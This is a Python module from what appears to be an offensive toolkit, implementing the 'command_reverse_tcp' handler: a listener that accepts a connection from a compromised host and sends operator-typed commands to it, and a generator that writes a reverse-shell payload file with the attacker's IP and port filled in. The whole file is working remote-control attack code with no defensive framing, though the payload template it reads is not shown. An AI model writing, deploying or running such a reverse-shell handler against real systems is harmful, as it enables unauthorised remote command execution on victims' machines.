import socket

def listen(bind_ip,bind_port):
    try:
        server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        server.bind((bind_ip,int(bind_port)))
        server.listen(5)
        print('[*] Listening in %s:%s' % (bind_ip,bind_port))
    except:
        print('[-] Error.')
    client,addr = server.accept()
    while True:
        cmd = input("Command> ")
        if cmd.lower() == 'exit':
            client.close()
            return 0
        client.send(cmd.encode())
        client.settimeout(5)
        re = client.recv(4096)
        print(re.decode('gbk'))
def payload(bind_ip,bind_port,file_path):
    payload_source = ''
    try:
        with open('./Libs/command_reverse_tcp/payload/payload.py','r') as payload:
            payload_source = payload.read().replace("command_reverse_tcp_ip",bind_ip).replace("command_reverse_tcp_port",str(bind_port))
        with open(file_path,'w') as payload:
            payload.write(payload_source)
    except:
        print('[-] Error.')
        return -1
    print('[*] File path: '+str(file_path))
    print('[*] Payload size: '+str(len(payload_source)))
def info():
    print('Usage: make command_reverse_tcp payload bind_ip bind_port file_path')
    print('Usage: make command_reverse_tcp listen bind_ip bind_port')